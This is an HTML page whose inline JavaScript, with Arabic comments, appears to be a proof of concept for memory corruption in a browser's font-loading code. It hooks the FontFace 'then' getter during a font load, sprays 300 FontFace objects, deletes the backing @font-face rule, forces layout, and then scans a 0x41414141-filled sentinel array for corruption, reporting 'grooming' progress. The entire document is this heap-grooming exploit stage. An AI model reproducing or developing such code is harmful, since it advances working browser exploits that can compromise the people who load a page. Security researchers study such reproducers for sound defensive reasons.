<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color:blue; font-family:monospace;">Status: Initializing Monitor...</div>
    <script>
        const debug = document.getElementById('debug');
        const MAGIC = 0x41414141;
        // الـ Sentinel: مصفوفة نراقبها بحثاً عن أي تغيير غير منطقي
        let sentinel = new Uint32Array(1024);
        sentinel.fill(MAGIC);

        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug.innerText = "Status: Hooked. Spraying 200 objects...";
                        
                        // زيادة الضغط تدريجياً لضمان التصادم
                        for(let i=0; i<300; i++) { 
                            new FontFace('y'+i, 'local(Helvetica)');
                        }
                        
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        // التحقق: هل الـ Sentinel تأثر؟
                        let corrupted = false;
                        for(let i=0; i<sentinel.length; i++) {
                            if(sentinel[i] !== MAGIC) {
                                corrupted = true;
                                debug.innerText = "!! CRITICAL: Corruption Detected at index " + i + " Value: " + sentinel[i].toString(16);
                                break;
                            }
                        }
                        
                        if(!corrupted) {
                            debug.innerText = "Status: Grooming complete. No corruption detected (Need more Spray).";
                        }
                    }
                    return undefined;
                }
            });

            document.fonts.load('1em x', 'AB').catch((e) => {
                // Ignore
            });
        };
    </script>
</body>
</html>
